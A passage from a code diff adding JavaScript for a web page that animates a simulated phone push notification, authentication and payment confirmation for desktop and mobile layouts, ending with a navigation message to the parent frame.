+setText('m-ssub-text', `${amountFull} · GIFTSY_SUPERMERCHANT`);
+
+/* -------------------------------------------------------
+   DESKTOP
+------------------------------------------------------- */
+// Push after 2s
+setTimeout(() => {
+  const n = document.getElementById('phone-notif');
+  if (n) n.classList.add('show');
+}, 2000);
+
+// 4-dot sequential loader
+let dotCount = 0;
+function updateDots(ids) {
+  ids.forEach((id, i) => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.className = 'wi-dot' + (i < dotCount ? ' filled' : '');
+  });
+}
+setInterval(() => {
+  dotCount = (dotCount + 1) % 5;
+  updateDots(['wd1','wd2','wd3','wd4']);
+  updateDots(['mwd1','mwd2','mwd3','mwd4']);
+}, 700);
+
+function desktopTapNotif() {
+  const n = document.getElementById('phone-notif');
+  n.classList.add('tap');
+  setTimeout(() => {
+    document.getElementById('lock-bg').classList.add('blurred');
+    n.style.opacity = '0';
+    n.style.transform = 'translateY(-14px) scale(.95)';
+    setTimeout(() => document.getElementById('phone-auth').classList.add('show'), 220);
+  }, 100);
+}
+
+function desktopConfirm() {
+  document.getElementById('phone-success').classList.add('show');
+  setTimeout(() => {
+    document.getElementById('desk-wait').style.display = 'none';
+    document.getElementById('desk-ok').style.display = 'block';
+  }, 900);
+  // Navigate to status after short delay
+  setTimeout(() => {
+    window.parent.postMessage({ type: 'navigate', to: '/status' }, '*');
+  }, 2000);
+}
+
+/* -------------------------------------------------------
+   MOBILE
+------------------------------------------------------- */
+// Push after 2s
+setTimeout(() => {
+  const mp = document.getElementById('m-push');
+  if (mp) mp.classList.add('show');
+}, 2000);
+
+function mobileTap() {
+  const mp = document.getElementById('m-push');
+  mp.classList.add('tap');
+  setTimeout(() => document.getElementById('m-auth').classList.add('show'), 130);
+}
+
+function mobileConfirm() {
+  document.getElementById('m-success').classList.add('show');
+  // Navigate to status after short delay
+  setTimeout(() => {
+    window.parent.postMessage({ type: 'navigate', to: '/status' }, '*');
+  }, 1500);
+}
+</script>
+</body>
+</html>
